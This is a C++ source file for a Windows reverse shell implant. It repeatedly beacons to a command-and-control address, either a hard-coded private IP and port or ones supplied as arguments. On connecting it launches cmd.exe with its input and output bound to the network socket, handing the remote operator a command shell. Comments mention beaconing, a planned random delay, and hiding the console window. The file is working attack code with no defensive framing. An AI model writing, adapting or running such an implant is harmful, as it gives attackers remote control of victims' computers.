#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>

// DEBUG, TEMP.
#include <iostream>

void RevShell(char* C2Server, int C2Port)
{
	while (true) {
		
		// BEACONING
		// NEED TO IMPLEMENT RANDOM DELAY
		Sleep(5000);



		// WSADATA object - contains details of application state regarding to network
		WSADATA wsaver;
		// Version comparison - whether compiled version of sockets is compatible with the older versions
		WSAStartup(MAKEWORD(2,2), &wsaver);


		SOCKET tcpsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		sockaddr_in addr;

		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		// This if statement triggers if connection to C&C errored out.
		if (WSAConnect(tcpsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
			std::cout << "[-] Error during connection..\n";
			closesocket(tcpsock);
			WSACleanup();
			// Go to next Beacon interaction if connection failed...
			continue;
		}
		// Else connection successfull..
		else {
			std::cout << "[+] Connected..\n" << std::endl;
			
			char RecvData[1024];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
			if (RecvCode <= 0){
				closesocket(tcpsock);
				WSACleanup();
				continue;
			}
			else {
				char Process[] = "cmd.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				// Socket is Handle for stdin/stdout/stderr descriptors of process
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(tcpsock, RecvData, 1024, 0);
				if (RecvCode <= 0){
					closesocket(tcpsock);
					WSACleanup();
					continue;
				} 
				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
			
		}

	}
}


int main(int argc, char **argv)
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_SHOWNORMAL);

	//std::cout << "Work in progres..\n";

	if (argc == 3)
	{
		int port = atoi(argv[2]);
		RevShell(argv[1],port);

	} else {
	char host[] = "192.168.56.112";
	int port = 8008;
	RevShell(host,port);
	}
	return 0;
}
